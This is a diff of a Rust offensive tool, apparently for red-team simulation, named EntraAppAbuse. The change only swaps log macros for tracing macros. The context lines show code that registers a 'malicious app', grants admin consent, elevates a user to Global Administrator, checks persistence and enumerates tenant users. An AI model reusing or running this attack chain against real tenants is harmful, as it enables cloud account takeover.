@@ -686,7 +686,7 @@ impl EntraAppAbuse {
             .id
             .ok_or_else(|| anyhow!("application creation response missing id"))?;
 
-        log::info!(
+        tracing::info!(
             "registered malicious app: '{}' (client_id={}, object_id={})",
             name,
             client_id,
@@ -761,7 +761,7 @@ impl EntraAppAbuse {
         let credential = AppCredential::encrypt_secret(&secret_value, &self.session_key)?
             .with_ids("", app_object_id, &secret_id);
 
-        log::info!(
+        tracing::info!(
             "added client secret to app object_id={} (secret_id={})",
             app_object_id,
             secret_id
@@ -844,7 +844,7 @@ impl EntraAppAbuse {
             let body = resp.text().await.unwrap_or_default();
             // Already exists is OK
             if !body.contains("AlreadyExists") && !body.contains("PermissionGrantExists") {
-                log::warn!("delegated permission grant failed (non-fatal): HTTP {} — {}", status, body);
+                tracing::warn!("delegated permission grant failed (non-fatal): HTTP {} — {}", status, body);
             }
         }
 
@@ -872,7 +872,7 @@ impl EntraAppAbuse {
                 let body = resp.text().await.unwrap_or_default();
                 // Already exists is OK
                 if !body.contains("AlreadyExists") && !body.contains("PermissionGrantExists") {
-                    log::warn!(
+                    tracing::warn!(
                         "app role assignment for '{}' failed (non-fatal): HTTP {} — {}",
                         perm.name,
                         status,
@@ -880,11 +880,11 @@ impl EntraAppAbuse {
                     );
                 }
             } else {
-                log::info!("granted application permission: {}", perm.name);
+                tracing::info!("granted application permission: {}", perm.name);
             }
         }
 
-        log::info!(
+        tracing::info!(
             "admin consent granted for app client_id={} ({} permissions)",
             app_client_id,
             permissions.len()
@@ -1052,7 +1052,7 @@ impl EntraAppAbuse {
             *cache = Some(CachedToken::from_response(&token_response));
         }
 
-        log::info!(
+        tracing::info!(
             "authenticated as app client_id={} (expires in {}s)",
             client_id,
             token_response.expires_in
@@ -1204,7 +1204,7 @@ impl EntraAppAbuse {
 
         if !resp.status().is_success() {
             // Role may already be activated — try to find it.
-            log::debug!("directory role activation returned: {}", resp.status());
+            tracing::debug!("directory role activation returned: {}", resp.status());
         }
 
         // Find the Global Admin role ID.
@@ -1250,7 +1250,7 @@ impl EntraAppAbuse {
             let status = resp.status();
             let body = resp.text().await.unwrap_or_default();
             if body.contains("AlreadyExists") {
-                log::info!(
+                tracing::info!(
                     "user {} is already a Global Admin",
                     target_user_id
                 );
@@ -1263,7 +1263,7 @@ impl EntraAppAbuse {
             );
         }
 
-        log::warn!(
+        tracing::warn!(
             "elevated user {} to Global Administrator",
             target_user_id
         );
@@ -1287,7 +1287,7 @@ impl EntraAppAbuse {
         let secret = match credential.decrypt_secret(&self.session_key) {
             Ok(s) => s,
             Err(e) => {
-                log::error!("failed to decrypt stored secret: {e}");
+                tracing::error!("failed to decrypt stored secret: {e}");
                 return Ok(false);
             }
         };
@@ -1302,14 +1302,14 @@ impl EntraAppAbuse {
             .await
         {
             Ok(_) => {
-                log::info!(
+                tracing::info!(
                     "persistence verified: app client_id={} still active",
                     credential.client_id
                 );
                 Ok(true)
             }
             Err(e) => {
-                log::warn!("persistence check failed: {e}");
+                tracing::warn!("persistence check failed: {e}");
                 Ok(false)
             }
         }
@@ -1365,7 +1365,7 @@ impl EntraAppAbuse {
             bail!("application deletion failed: HTTP {} — {}", status, body);
         }
 
-        log::info!("deleted malicious app object_id={}", app_object_id);
+        tracing::info!("deleted malicious app object_id={}", app_object_id);
         Ok(())
     }
 
@@ -1426,7 +1426,7 @@ impl EntraAppAbuse {
             .await
             .context("step 5: tenant enumeration failed")?;
 
-        log::info!(
+        tracing::info!(
             "full attack chain complete: registered '{}', enumerated {} users, {} groups",
             app.display_name,
             tenant_info.users.len(),
@@ -1493,7 +1493,7 @@ impl EntraAppAbuse {
             if !resp.status().is_success() {
                 let status = resp.status();
                 let body = resp.text().await.unwrap_or_default();
-                log::warn!("Graph API pagination failed: HTTP {} — {}", status, body);
+                tracing::warn!("Graph API pagination failed: HTTP {} — {}", status, body);
                 break;
             }
 
